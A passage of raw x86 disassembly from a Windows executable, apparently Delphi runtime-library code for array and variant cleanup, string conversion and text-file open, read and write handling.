  403585:	83 c3 10             	add    $0x10,%ebx
  403588:	4f                   	dec    %edi
  403589:	7f ef                	jg     0x40357a
  40358b:	eb 30                	jmp    0x4035bd
  40358d:	55                   	push   %ebp
  40358e:	89 d5                	mov    %edx,%ebp
  403590:	89 d8                	mov    %ebx,%eax
  403592:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403596:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  40359a:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  40359e:	e8 9d ff ff ff       	call   0x403540
  4035a3:	4f                   	dec    %edi
  4035a4:	7f ea                	jg     0x403590
  4035a6:	5d                   	pop    %ebp
  4035a7:	eb 14                	jmp    0x4035bd
  4035a9:	55                   	push   %ebp
  4035aa:	89 d5                	mov    %edx,%ebp
  4035ac:	89 d8                	mov    %ebx,%eax
  4035ae:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4035b2:	89 f2                	mov    %esi,%edx
  4035b4:	e8 5f ff ff ff       	call   0x403518
  4035b9:	4f                   	dec    %edi
  4035ba:	7f f0                	jg     0x4035ac
  4035bc:	5d                   	pop    %ebp
  4035bd:	5f                   	pop    %edi
  4035be:	5e                   	pop    %esi
  4035bf:	5b                   	pop    %ebx
  4035c0:	c3                   	ret
  4035c1:	8d 40 00             	lea    0x0(%eax),%eax
  4035c4:	b9 01 00 00 00       	mov    $0x1,%ecx
  4035c9:	e9 72 ff ff ff       	jmp    0x403540
  4035ce:	c3                   	ret
  4035cf:	90                   	nop
  4035d0:	31 c9                	xor    %ecx,%ecx
  4035d2:	53                   	push   %ebx
  4035d3:	8a 4a 01             	mov    0x1(%edx),%cl
  4035d6:	56                   	push   %esi
  4035d7:	57                   	push   %edi
  4035d8:	89 c3                	mov    %eax,%ebx
  4035da:	8d 74 0a 0a          	lea    0xa(%edx,%ecx,1),%esi
  4035de:	8b 7c 0a 06          	mov    0x6(%edx,%ecx,1),%edi
  4035e2:	8b 46 04             	mov    0x4(%esi),%eax
  4035e5:	8b 16                	mov    (%esi),%edx
  4035e7:	01 d8                	add    %ebx,%eax
  4035e9:	e8 92 00 00 00       	call   0x403680
  4035ee:	83 c6 08             	add    $0x8,%esi
  4035f1:	4f                   	dec    %edi
  4035f2:	7f ee                	jg     0x4035e2
  4035f4:	5f                   	pop    %edi
  4035f5:	5e                   	pop    %esi
  4035f6:	5b                   	pop    %ebx
  4035f7:	c3                   	ret
  4035f8:	53                   	push   %ebx
  4035f9:	56                   	push   %esi
  4035fa:	57                   	push   %edi
  4035fb:	89 c3                	mov    %eax,%ebx
  4035fd:	89 d6                	mov    %edx,%esi
  4035ff:	89 cf                	mov    %ecx,%edi
  403601:	31 d2                	xor    %edx,%edx
  403603:	8a 06                	mov    (%esi),%al
  403605:	8a 56 01             	mov    0x1(%esi),%dl
  403608:	80 f8 0a             	cmp    $0xa,%al
  40360b:	74 19                	je     0x403626
  40360d:	80 f8 0c             	cmp    $0xc,%al
  403610:	74 2b                	je     0x40363d
  403612:	80 f8 0d             	cmp    $0xd,%al
  403615:	74 35                	je     0x40364c
  403617:	80 f8 0e             	cmp    $0xe,%al
  40361a:	74 4c                	je     0x403668
  40361c:	b0 02                	mov    $0x2,%al
  40361e:	5f                   	pop    %edi
  40361f:	5e                   	pop    %esi
  403620:	5b                   	pop    %ebx
  403621:	e9 ee ef ff ff       	jmp    0x402614
  403626:	83 f9 01             	cmp    $0x1,%ecx
  403629:	89 d8                	mov    %ebx,%eax
  40362b:	7f 07                	jg     0x403634
  40362d:	e8 ae fa ff ff       	call   0x4030e0
  403632:	eb 48                	jmp    0x40367c
  403634:	89 ca                	mov    %ecx,%edx
  403636:	e8 c5 fa ff ff       	call   0x403100
  40363b:	eb 3f                	jmp    0x40367c
  40363d:	89 d8                	mov    %ebx,%eax
  40363f:	83 c3 10             	add    $0x10,%ebx
  403642:	e8 05 04 00 00       	call   0x403a4c
  403647:	4f                   	dec    %edi
  403648:	7f f3                	jg     0x40363d
  40364a:	eb 30                	jmp    0x40367c
  40364c:	55                   	push   %ebp
  40364d:	89 d5                	mov    %edx,%ebp
  40364f:	89 d8                	mov    %ebx,%eax
  403651:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403655:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  403659:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  40365d:	e8 96 ff ff ff       	call   0x4035f8
  403662:	4f                   	dec    %edi
  403663:	7f ea                	jg     0x40364f
  403665:	5d                   	pop    %ebp
  403666:	eb 14                	jmp    0x40367c
  403668:	55                   	push   %ebp
  403669:	89 d5                	mov    %edx,%ebp
  40366b:	89 d8                	mov    %ebx,%eax
  40366d:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403671:	89 f2                	mov    %esi,%edx
  403673:	e8 58 ff ff ff       	call   0x4035d0
  403678:	4f                   	dec    %edi
  403679:	7f f0                	jg     0x40366b
  40367b:	5d                   	pop    %ebp
  40367c:	5f                   	pop    %edi
  40367d:	5e                   	pop    %esi
  40367e:	5b                   	pop    %ebx
  40367f:	c3                   	ret
  403680:	b9 01 00 00 00       	mov    $0x1,%ecx
  403685:	e9 6e ff ff ff       	jmp    0x4035f8
  40368a:	c3                   	ret
  40368b:	90                   	nop
  40368c:	53                   	push   %ebx
  40368d:	56                   	push   %esi
  40368e:	57                   	push   %edi
  40368f:	55                   	push   %ebp
  403690:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  403696:	8b f1                	mov    %ecx,%esi
  403698:	8b da                	mov    %edx,%ebx
  40369a:	8b f8                	mov    %eax,%edi
  40369c:	85 db                	test   %ebx,%ebx
  40369e:	75 09                	jne    0x4036a9
  4036a0:	8b c6                	mov    %esi,%eax
  4036a2:	e8 39 fa ff ff       	call   0x4030e0
  4036a7:	eb 61                	jmp    0x40370a
  4036a9:	81 fb 00 04 00 00    	cmp    $0x400,%ebx
  4036af:	7d 26                	jge    0x4036d7
  4036b1:	6a 00                	push   $0x0
  4036b3:	6a 00                	push   $0x0
  4036b5:	68 00 08 00 00       	push   $0x800
  4036ba:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4036be:	50                   	push   %eax
  4036bf:	53                   	push   %ebx
  4036c0:	57                   	push   %edi
  4036c1:	6a 00                	push   $0x0
  4036c3:	6a 00                	push   $0x0
  4036c5:	e8 7e db ff ff       	call   0x401248
  4036ca:	8b c8                	mov    %eax,%ecx
  4036cc:	8b d4                	mov    %esp,%edx
  4036ce:	8b c6                	mov    %esi,%eax
  4036d0:	e8 eb fa ff ff       	call   0x4031c0
  4036d5:	eb 33                	jmp    0x40370a
  4036d7:	6a 00                	push   $0x0
  4036d9:	6a 00                	push   $0x0
  4036db:	6a 00                	push   $0x0
  4036dd:	6a 00                	push   $0x0
  4036df:	53                   	push   %ebx
  4036e0:	57                   	push   %edi
  4036e1:	6a 00                	push   $0x0
  4036e3:	6a 00                	push   $0x0
  4036e5:	e8 5e db ff ff       	call   0x401248
  4036ea:	8b e8                	mov    %eax,%ebp
  4036ec:	8b c6                	mov    %esi,%eax
  4036ee:	8b cd                	mov    %ebp,%ecx
  4036f0:	33 d2                	xor    %edx,%edx
  4036f2:	e8 c9 fa ff ff       	call   0x4031c0
  4036f7:	6a 00                	push   $0x0
  4036f9:	6a 00                	push   $0x0
  4036fb:	55                   	push   %ebp
  4036fc:	8b 06                	mov    (%esi),%eax
  4036fe:	50                   	push   %eax
  4036ff:	53                   	push   %ebx
  403700:	57                   	push   %edi
  403701:	6a 00                	push   $0x0
  403703:	6a 00                	push   $0x0
  403705:	e8 3e db ff ff       	call   0x401248
  40370a:	81 c4 00 08 00 00    	add    $0x800,%esp
  403710:	5d                   	pop    %ebp
  403711:	5f                   	pop    %edi
  403712:	5e                   	pop    %esi
  403713:	5b                   	pop    %ebx
  403714:	c3                   	ret
  403715:	8d 40 00             	lea    0x0(%eax),%eax
  403718:	53                   	push   %ebx
  403719:	56                   	push   %esi
  40371a:	8b f2                	mov    %edx,%esi
  40371c:	8b d8                	mov    %eax,%ebx
  40371e:	53                   	push   %ebx
  40371f:	e8 34 db ff ff       	call   0x401258
  403724:	8b d0                	mov    %eax,%edx
  403726:	8b ce                	mov    %esi,%ecx
  403728:	8b c3                	mov    %ebx,%eax
  40372a:	e8 5d ff ff ff       	call   0x40368c
  40372f:	5e                   	pop    %esi
  403730:	5b                   	pop    %ebx
  403731:	c3                   	ret
  403732:	8b c0                	mov    %eax,%eax
  403734:	53                   	push   %ebx
  403735:	56                   	push   %esi
  403736:	57                   	push   %edi
  403737:	55                   	push   %ebp
  403738:	81 c4 00 f8 ff ff    	add    $0xfffff800,%esp
  40373e:	8b d8                	mov    %eax,%ebx
  403740:	8b c3                	mov    %ebx,%eax
  403742:	e8 0d fb ff ff       	call   0x403254
  403747:	8b f0                	mov    %eax,%esi
  403749:	8b c3                	mov    %ebx,%eax
  40374b:	e8 04 fb ff ff       	call   0x403254
  403750:	3d 00 04 00 00       	cmp    $0x400,%eax
  403755:	7d 2b                	jge    0x403782
  403757:	68 00 04 00 00       	push   $0x400
  40375c:	8d 44 24 04          	lea    0x4(%esp),%eax
  403760:	50                   	push   %eax
  403761:	56                   	push   %esi
  403762:	8b c3                	mov    %ebx,%eax
  403764:	e8 3b fc ff ff       	call   0x4033a4
  403769:	50                   	push   %eax
  40376a:	6a 00                	push   $0x0
  40376c:	6a 00                	push   $0x0
  40376e:	e8 bd da ff ff       	call   0x401230
  403773:	50                   	push   %eax
  403774:	8d 44 24 04          	lea    0x4(%esp),%eax
  403778:	50                   	push   %eax
  403779:	e8 d2 da ff ff       	call   0x401250
  40377e:	8b f8                	mov    %eax,%edi
  403780:	eb 28                	jmp    0x4037aa
  403782:	6a 00                	push   $0x0
  403784:	6a 00                	push   $0x0
  403786:	56                   	push   %esi
  403787:	53                   	push   %ebx
  403788:	6a 00                	push   $0x0
  40378a:	6a 00                	push   $0x0
  40378c:	e8 9f da ff ff       	call   0x401230
  403791:	8b e8                	mov    %eax,%ebp
  403793:	55                   	push   %ebp
  403794:	6a 00                	push   $0x0
  403796:	e8 b5 da ff ff       	call   0x401250
  40379b:	8b f8                	mov    %eax,%edi
  40379d:	55                   	push   %ebp
  40379e:	57                   	push   %edi
  40379f:	56                   	push   %esi
  4037a0:	53                   	push   %ebx
  4037a1:	6a 00                	push   $0x0
  4037a3:	6a 00                	push   $0x0
  4037a5:	e8 86 da ff ff       	call   0x401230
  4037aa:	8b c7                	mov    %edi,%eax
  4037ac:	81 c4 00 08 00 00    	add    $0x800,%esp
  4037b2:	5d                   	pop    %ebp
  4037b3:	5f                   	pop    %edi
  4037b4:	5e                   	pop    %esi
  4037b5:	5b                   	pop    %ebx
  4037b6:	c3                   	ret
  4037b7:	90                   	nop
  4037b8:	b0 0f                	mov    $0xf,%al
  4037ba:	e9 55 ee ff ff       	jmp    0x402614
  4037bf:	c3                   	ret
  4037c0:	31 d2                	xor    %edx,%edx
  4037c2:	66 8b 10             	mov    (%eax),%dx
  4037c5:	f7 c2 00 40 00 00    	test   $0x4000,%edx
  4037cb:	75 1a                	jne    0x4037e7
  4037cd:	83 fa 08             	cmp    $0x8,%edx
  4037d0:	72 15                	jb     0x4037e7
  4037d2:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  4037d8:	75 13                	jne    0x4037ed
  4037da:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4037df:	83 c0 08             	add    $0x8,%eax
  4037e2:	e9 f9 f8 ff ff       	jmp    0x4030e0
  4037e7:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4037ec:	c3                   	ret
  4037ed:	50                   	push   %eax
  4037ee:	e8 6d da ff ff       	call   0x401260
  4037f3:	c3                   	ret
  4037f4:	39 d0                	cmp    %edx,%eax
  4037f6:	74 64                	je     0x40385c
  4037f8:	66 83 38 08          	cmpw   $0x8,(%eax)
  4037fc:	72 1b                	jb     0x403819
  4037fe:	50                   	push   %eax
  4037ff:	52                   	push   %edx
  403800:	66 81 38 00 01       	cmpw   $0x100,(%eax)
  403805:	74 08                	je     0x40380f
  403807:	50                   	push   %eax
  403808:	e8 53 da ff ff       	call   0x401260
  40380d:	eb 08                	jmp    0x403817
  40380f:	83 c0 08             	add    $0x8,%eax
  403812:	e8 c9 f8 ff ff       	call   0x4030e0
  403817:	5a                   	pop    %edx
  403818:	58                   	pop    %eax
  403819:	66 83 3a 08          	cmpw   $0x8,(%edx)
  40381d:	73 11                	jae    0x403830
  40381f:	8b 0a                	mov    (%edx),%ecx
  403821:	89 08                	mov    %ecx,(%eax)
  403823:	8b 4a 08             	mov    0x8(%edx),%ecx
  403826:	89 48 08             	mov    %ecx,0x8(%eax)
  403829:	8b 4a 0c             	mov    0xc(%edx),%ecx
  40382c:	89 48 0c             	mov    %ecx,0xc(%eax)
  40382f:	c3                   	ret
  403830:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  403835:	75 19                	jne    0x403850
  403837:	8b 52 08             	mov    0x8(%edx),%edx
  40383a:	09 d2                	or     %edx,%edx
  40383c:	74 09                	je     0x403847
  40383e:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403841:	41                   	inc    %ecx
  403842:	7e 03                	jle    0x403847
  403844:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403847:	66 c7 00 00 01       	movw   $0x100,(%eax)
  40384c:	89 50 08             	mov    %edx,0x8(%eax)
  40384f:	c3                   	ret
  403850:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403855:	52                   	push   %edx
  403856:	50                   	push   %eax
  403857:	e8 0c da ff ff       	call   0x401268
  40385c:	c3                   	ret
  40385d:	8d 40 00             	lea    0x0(%eax),%eax
  403860:	55                   	push   %ebp
  403861:	8b ec                	mov    %esp,%ebp
  403863:	83 c4 f0             	add    $0xfffffff0,%esp
  403866:	53                   	push   %ebx
  403867:	56                   	push   %esi
  403868:	57                   	push   %edi
  403869:	8b f9                	mov    %ecx,%edi
  40386b:	8b f2                	mov    %edx,%esi
  40386d:	8b d8                	mov    %eax,%ebx
  40386f:	66 81 3b 00 01       	cmpw   $0x100,(%ebx)
  403874:	75 3b                	jne    0x4038b1
  403876:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  40387c:	57                   	push   %edi
  40387d:	6a 00                	push   $0x0
  40387f:	68 00 04 00 00       	push   $0x400
  403884:	56                   	push   %esi
  403885:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403888:	50                   	push   %eax
  403889:	e8 e2 d9 ff ff       	call   0x401270
  40388e:	85 c0                	test   %eax,%eax
  403890:	74 05                	je     0x403897
  403892:	e8 21 ff ff ff       	call   0x4037b8
  403897:	8b c3                	mov    %ebx,%eax
  403899:	e8 22 ff ff ff       	call   0x4037c0
  40389e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4038a1:	89 03                	mov    %eax,(%ebx)
  4038a3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4038a6:	89 43 08             	mov    %eax,0x8(%ebx)
  4038a9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4038ac:	89 43 0c             	mov    %eax,0xc(%ebx)
  4038af:	eb 18                	jmp    0x4038c9
  4038b1:	57                   	push   %edi
  4038b2:	6a 00                	push   $0x0
  4038b4:	68 00 04 00 00       	push   $0x400
  4038b9:	56                   	push   %esi
  4038ba:	53                   	push   %ebx
  4038bb:	e8 b0 d9 ff ff       	call   0x401270
  4038c0:	85 c0                	test   %eax,%eax
  4038c2:	74 05                	je     0x4038c9
  4038c4:	e8 ef fe ff ff       	call   0x4037b8
  4038c9:	5f                   	pop    %edi
  4038ca:	5e                   	pop    %esi
  4038cb:	5b                   	pop    %ebx
  4038cc:	8b e5                	mov    %ebp,%esp
  4038ce:	5d                   	pop    %ebp
  4038cf:	c3                   	ret
  4038d0:	55                   	push   %ebp
  4038d1:	8b ec                	mov    %esp,%ebp
  4038d3:	51                   	push   %ecx
  4038d4:	53                   	push   %ebx
  4038d5:	8b d8                	mov    %eax,%ebx
  4038d7:	33 c0                	xor    %eax,%eax
  4038d9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4038dc:	8b 42 08             	mov    0x8(%edx),%eax
  4038df:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4038e2:	e8 31 fe ff ff       	call   0x403718
  4038e7:	8b c3                	mov    %ebx,%eax
  4038e9:	e8 d2 fe ff ff       	call   0x4037c0
  4038ee:	66 c7 03 00 01       	movw   $0x100,(%ebx)
  4038f3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4038f6:	89 43 08             	mov    %eax,0x8(%ebx)
  4038f9:	5b                   	pop    %ebx
  4038fa:	59                   	pop    %ecx
  4038fb:	5d                   	pop    %ebp
  4038fc:	c3                   	ret
  4038fd:	8d 40 00             	lea    0x0(%eax),%eax
  403900:	53                   	push   %ebx
  403901:	56                   	push   %esi
  403902:	8b d8                	mov    %eax,%ebx
  403904:	8b 42 08             	mov    0x8(%edx),%eax
  403907:	e8 28 fe ff ff       	call   0x403734
  40390c:	8b f0                	mov    %eax,%esi
  40390e:	8b c3                	mov    %ebx,%eax
  403910:	e8 ab fe ff ff       	call   0x4037c0
  403915:	66 c7 03 08 00       	movw   $0x8,(%ebx)
  40391a:	89 73 08             	mov    %esi,0x8(%ebx)
  40391d:	5e                   	pop    %esi
  40391e:	5b                   	pop    %ebx
  40391f:	c3                   	ret
  403920:	55                   	push   %ebp
  403921:	8b ec                	mov    %esp,%ebp
  403923:	83 c4 ec             	add    $0xffffffec,%esp
  403926:	53                   	push   %ebx
  403927:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40392a:	66 8b 02             	mov    (%edx),%ax
  40392d:	8b d9                	mov    %ecx,%ebx
  40392f:	66 3b d8             	cmp    %ax,%bx
  403932:	75 0d                	jne    0x403941
  403934:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403937:	e8 b8 fe ff ff       	call   0x4037f4
  40393c:	e9 c8 00 00 00       	jmp    0x403a09
  403941:	66 3d 00 01          	cmp    $0x100,%ax
  403945:	75 59                	jne    0x4039a0
  403947:	66 83 fb 08          	cmp    $0x8,%bx
  40394b:	75 0d                	jne    0x40395a
  40394d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403950:	e8 ab ff ff ff       	call   0x403900
  403955:	e9 af 00 00 00       	jmp    0x403a09
  40395a:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  403960:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403963:	e8 98 ff ff ff       	call   0x403900
  403968:	33 c0                	xor    %eax,%eax
  40396a:	55                   	push   %ebp
  40396b:	68 99 39 40 00       	push   $0x403999
  403970:	64 ff 30             	push   %fs:(%eax)
  403973:	64 89 20             	mov    %esp,%fs:(%eax)
  403976:	8d 55 f0             	lea    -0x10(%ebp),%edx
  403979:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40397c:	8b cb                	mov    %ebx,%ecx
  40397e:	e8 dd fe ff ff       	call   0x403860
  403983:	33 c0                	xor    %eax,%eax
  403985:	5a                   	pop    %edx
  403986:	59                   	pop    %ecx
  403987:	59                   	pop    %ecx
  403988:	64 89 10             	mov    %edx,%fs:(%eax)
  40398b:	68 09 3a 40 00       	push   $0x403a09
  403990:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403993:	e8 28 fe ff ff       	call   0x4037c0
  403998:	c3                   	ret
  403999:	e9 c2 f3 ff ff       	jmp    0x402d60
  40399e:	eb f0                	jmp    0x403990
  4039a0:	66 81 fb 00 01       	cmp    $0x100,%bx
  4039a5:	75 58                	jne    0x4039ff
  4039a7:	66 83 f8 08          	cmp    $0x8,%ax
  4039ab:	75 0a                	jne    0x4039b7
  4039ad:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4039b0:	e8 1b ff ff ff       	call   0x4038d0
  4039b5:	eb 52                	jmp    0x403a09
  4039b7:	66 c7 45 f0 00 00    	movw   $0x0,-0x10(%ebp)
  4039bd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4039c0:	66 b9 08 00          	mov    $0x8,%cx
  4039c4:	e8 97 fe ff ff       	call   0x403860
  4039c9:	33 c0                	xor    %eax,%eax
  4039cb:	55                   	push   %ebp
  4039cc:	68 f8 39 40 00       	push   $0x4039f8
  4039d1:	64 ff 30             	push   %fs:(%eax)
  4039d4:	64 89 20             	mov    %esp,%fs:(%eax)
  4039d7:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4039da:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4039dd:	e8 ee fe ff ff       	call   0x4038d0
  4039e2:	33 c0                	xor    %eax,%eax
  4039e4:	5a                   	pop    %edx
  4039e5:	59                   	pop    %ecx
  4039e6:	59                   	pop    %ecx
  4039e7:	64 89 10             	mov    %edx,%fs:(%eax)
  4039ea:	68 09 3a 40 00       	push   $0x403a09
  4039ef:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4039f2:	e8 c9 fd ff ff       	call   0x4037c0
  4039f7:	c3                   	ret
  4039f8:	e9 63 f3 ff ff       	jmp    0x402d60
  4039fd:	eb f0                	jmp    0x4039ef
  4039ff:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403a02:	8b cb                	mov    %ebx,%ecx
  403a04:	e8 57 fe ff ff       	call   0x403860
  403a09:	5b                   	pop    %ebx
  403a0a:	8b e5                	mov    %ebp,%esp
  403a0c:	5d                   	pop    %ebp
  403a0d:	c3                   	ret
  403a0e:	8b c0                	mov    %eax,%eax
  403a10:	66 81 3a 00 01       	cmpw   $0x100,(%edx)
  403a15:	75 08                	jne    0x403a1f
  403a17:	8b 52 08             	mov    0x8(%edx),%edx
  403a1a:	e9 11 f7 ff ff       	jmp    0x403130
  403a1f:	53                   	push   %ebx
  403a20:	89 c3                	mov    %eax,%ebx
  403a22:	83 ec 10             	sub    $0x10,%esp
  403a25:	66 c7 04 24 00 00    	movw   $0x0,(%esp)
  403a2b:	89 e0                	mov    %esp,%eax
  403a2d:	b9 00 01 00 00       	mov    $0x100,%ecx
  403a32:	e8 e9 fe ff ff       	call   0x403920
  403a37:	89 d8                	mov    %ebx,%eax
  403a39:	e8 a2 f6 ff ff       	call   0x4030e0
  403a3e:	8b 44 24 08          	mov    0x8(%esp),%eax
  403a42:	89 03                	mov    %eax,(%ebx)
  403a44:	83 c4 10             	add    $0x10,%esp
  403a47:	5b                   	pop    %ebx
  403a48:	c3                   	ret
  403a49:	8d 40 00             	lea    0x0(%eax),%eax
  403a4c:	e9 6f fd ff ff       	jmp    0x4037c0
  403a51:	c3                   	ret
  403a52:	8b c0                	mov    %eax,%eax
  403a54:	a1 8c c4 40 00       	mov    0x40c48c,%eax
  403a59:	8b 10                	mov    (%eax),%edx
  403a5b:	89 15 8c c4 40 00    	mov    %edx,0x40c48c
  403a61:	8b 50 04             	mov    0x4(%eax),%edx
  403a64:	89 15 24 c0 40 00    	mov    %edx,0x40c024
  403a6a:	8b 40 08             	mov    0x8(%eax),%eax
  403a6d:	ff d0                	call   *%eax
  403a6f:	c3                   	ret
  403a70:	8b 15 8c c4 40 00    	mov    0x40c48c,%edx
  403a76:	89 10                	mov    %edx,(%eax)
  403a78:	8b 15 24 c0 40 00    	mov    0x40c024,%edx
  403a7e:	89 50 04             	mov    %edx,0x4(%eax)
  403a81:	a3 8c c4 40 00       	mov    %eax,0x40c48c
  403a86:	c7 05 24 c0 40 00 54 	movl   $0x403a54,0x40c024
  403a8d:	3a 40 00 
  403a90:	c3                   	ret
  403a91:	8d 40 00             	lea    0x0(%eax),%eax
  403a94:	33 d2                	xor    %edx,%edx
  403a96:	89 50 10             	mov    %edx,0x10(%eax)
  403a99:	89 50 0c             	mov    %edx,0xc(%eax)
  403a9c:	52                   	push   %edx
  403a9d:	8d 50 10             	lea    0x10(%eax),%edx
  403aa0:	52                   	push   %edx
  403aa1:	ff 70 08             	push   0x8(%eax)
  403aa4:	ff 70 14             	push   0x14(%eax)
  403aa7:	ff 30                	push   (%eax)
  403aa9:	e8 32 d7 ff ff       	call   0x4011e0
  403aae:	85 c0                	test   %eax,%eax
  403ab0:	74 03                	je     0x403ab5
  403ab2:	33 c0                	xor    %eax,%eax
  403ab4:	c3                   	ret
  403ab5:	e8 5e d7 ff ff       	call   0x401218
  403aba:	c3                   	ret
  403abb:	33 c0                	xor    %eax,%eax
  403abd:	c3                   	ret
  403abe:	51                   	push   %ecx
  403abf:	8b 50 0c             	mov    0xc(%eax),%edx
  403ac2:	85 d2                	test   %edx,%edx
  403ac4:	7e 1a                	jle    0x403ae0
  403ac6:	33 c9                	xor    %ecx,%ecx
  403ac8:	89 48 0c             	mov    %ecx,0xc(%eax)
  403acb:	51                   	push   %ecx
  403acc:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403ad0:	51                   	push   %ecx
  403ad1:	52                   	push   %edx
  403ad2:	ff 70 14             	push   0x14(%eax)
  403ad5:	ff 30                	push   (%eax)
  403ad7:	e8 24 d7 ff ff       	call   0x401200
  403adc:	85 c0                	test   %eax,%eax
  403ade:	74 04                	je     0x403ae4
  403ae0:	33 c0                	xor    %eax,%eax
  403ae2:	59                   	pop    %ecx
  403ae3:	c3                   	ret
  403ae4:	e8 2f d7 ff ff       	call   0x401218
  403ae9:	eb f7                	jmp    0x403ae2
  403aeb:	ff 30                	push   (%eax)
  403aed:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403af4:	e8 9f d6 ff ff       	call   0x401198
  403af9:	48                   	dec    %eax
  403afa:	75 01                	jne    0x403afd
  403afc:	c3                   	ret
  403afd:	e8 16 d7 ff ff       	call   0x401218
  403b02:	c3                   	ret
  403b03:	56                   	push   %esi
  403b04:	8b f0                	mov    %eax,%esi
  403b06:	8b 46 04             	mov    0x4(%esi),%eax
  403b09:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  403b0e:	74 0b                	je     0x403b1b
  403b10:	48                   	dec    %eax
  403b11:	74 20                	je     0x403b33
  403b13:	48                   	dec    %eax
  403b14:	74 2e                	je     0x403b44
  403b16:	e9 49 01 00 00       	jmp    0x403c64
  403b1b:	b8 00 00 00 80       	mov    $0x80000000,%eax
  403b20:	ba 02 00 00 00       	mov    $0x2,%edx
  403b25:	b9 03 00 00 00       	mov    $0x3,%ecx
  403b2a:	c7 46 1c 94 3a 40 00 	movl   $0x403a94,0x1c(%esi)
  403b31:	eb 27                	jmp    0x403b5a
  403b33:	b8 00 00 00 40       	mov    $0x40000000,%eax
  403b38:	ba 01 00 00 00       	mov    $0x1,%edx
  403b3d:	b9 02 00 00 00       	mov    $0x2,%ecx
  403b42:	eb 0f                	jmp    0x403b53
  403b44:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403b49:	ba 01 00 00 00       	mov    $0x1,%edx
  403b4e:	b9 03 00 00 00       	mov    $0x3,%ecx
  403b53:	c7 46 1c be 3a 40 00 	movl   $0x403abe,0x1c(%esi)
  403b5a:	c7 46 24 eb 3a 40 00 	movl   $0x403aeb,0x24(%esi)
  403b61:	c7 46 20 bb 3a 40 00 	movl   $0x403abb,0x20(%esi)
  403b68:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  403b6c:	0f 84 ae 00 00 00    	je     0x403c20
  403b72:	6a 00                	push   $0x0
  403b74:	68 80 00 00 00       	push   $0x80
  403b79:	51                   	push   %ecx
  403b7a:	6a 00                	push   $0x0
  403b7c:	52                   	push   %edx
  403b7d:	50                   	push   %eax
  403b7e:	8d 46 48             	lea    0x48(%esi),%eax
  403b81:	50                   	push   %eax
  403b82:	e8 19 d6 ff ff       	call   0x4011a0
  403b87:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b8a:	0f 84 eb 00 00 00    	je     0x403c7b
  403b90:	89 06                	mov    %eax,(%esi)
  403b92:	81 7e 04 b3 d7 00 00 	cmpl   $0xd7b3,0x4(%esi)
  403b99:	0f 85 a3 00 00 00    	jne    0x403c42
  403b9f:	ff 4e 04             	decl   0x4(%esi)
  403ba2:	6a 00                	push   $0x0
  403ba4:	ff 36                	push   (%esi)
  403ba6:	e8 15 d6 ff ff       	call   0x4011c0
  403bab:	40                   	inc    %eax
  403bac:	0f 84 c9 00 00 00    	je     0x403c7b
  403bb2:	2d 81 00 00 00       	sub    $0x81,%eax
  403bb7:	73 02                	jae    0x403bbb
  403bb9:	33 c0                	xor    %eax,%eax
  403bbb:	6a 00                	push   $0x0
  403bbd:	6a 00                	push   $0x0
  403bbf:	50                   	push   %eax
  403bc0:	ff 36                	push   (%esi)
  403bc2:	e8 31 d6 ff ff       	call   0x4011f8
  403bc7:	40                   	inc    %eax
  403bc8:	0f 84 ad 00 00 00    	je     0x403c7b
  403bce:	6a 00                	push   $0x0
  403bd0:	8b d4                	mov    %esp,%edx
  403bd2:	6a 00                	push   $0x0
  403bd4:	52                   	push   %edx
  403bd5:	68 80 00 00 00       	push   $0x80
  403bda:	8d 96 4c 01 00 00    	lea    0x14c(%esi),%edx
  403be0:	52                   	push   %edx
  403be1:	ff 36                	push   (%esi)
  403be3:	e8 f8 d5 ff ff       	call   0x4011e0
  403be8:	5a                   	pop    %edx
  403be9:	48                   	dec    %eax
  403bea:	0f 85 8b 00 00 00    	jne    0x403c7b
  403bf0:	33 c0                	xor    %eax,%eax
  403bf2:	3b c2                	cmp    %edx,%eax
  403bf4:	73 4c                	jae    0x403c42
  403bf6:	80 bc 06 4c 01 00 00 	cmpb   $0x1a,0x14c(%esi,%eax,1)
  403bfd:	1a 
  403bfe:	74 03                	je     0x403c03
  403c00:	40                   	inc    %eax
  403c01:	eb ef                	jmp    0x403bf2
  403c03:	6a 02                	push   $0x2
